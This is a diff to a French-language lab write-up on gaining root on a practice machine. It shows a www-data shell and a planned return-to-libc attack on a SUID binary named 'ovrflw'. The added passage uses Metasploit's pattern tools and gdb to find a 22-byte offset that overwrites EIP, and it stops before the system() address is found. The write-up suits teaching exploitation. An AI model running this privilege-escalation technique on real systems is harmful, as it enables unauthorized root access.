@@ -195,7 +195,7 @@ Et en retour nous avons :
     www-data@checkpoint04:/var/www/dev/includes/php/uploads$ id
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
    
-# Privesc
+# www-data > root
 
 Lorsque nous cherchons les fichiers `SUID`, nous pouvons voir un fichier atypique qui se nomme `ovrflw`.
 
@@ -251,3 +251,29 @@ Nous pouvons constater que `GNU_STACK` à seulement deux `flags` `R` pour read (
 Donc, nous procéderons à une attaque de type `retour à la libc`, nous commençerons par trouver tout d'abord la taille du `buffer`, nous chercherons ensuite l'adresse de la fonction `system()` dans la libc, ensuite l'adresse de retour pour la fonction `exit()`, et enfin l'argument `/bin/sh`.
 
 ![test](https://i.imgur.com/Fa3DlCN.png)
+
+## Taille du buffer
+
+Donc commençons par chercher la taille du buffer avec l'outil `pattern_create.rb`, je vais créer un pattern de 100 caractères et ensuite les envoyés avec `gdb` pour voir l'adresse de retour et de voir la taille du `buffer`.
+
+    root@wildcodeschool# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
+    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+    
+Par la suite, je lancerai l'outil `gdb` et de mettre la chaîne :
+
+    (gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+    Starting program: /usr/bin/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+    Your name : Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x61413761 in ?? ()
+    
+Comme nous pouvons le voir, le programme nous retourne l'adresse `0x61413761`, nous avons juste à lancer l'outil `pattern_offset.rb` pour voir l'offset et également la taille du `buffer`.
+
+    root@wildcodeschool# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x61413761
+    [*] Exact match at offset 22
+    
+Donc, si nous dépassons les 22 caractères, nous écraserons le registre `EIP` (EIP est un registre qui pointe vers la prochaine instruction, donc après les 22 caractères nous metterons l'adresse de `system()` pour qu'il pointe `system()`).
+
+## Adresse de system
+
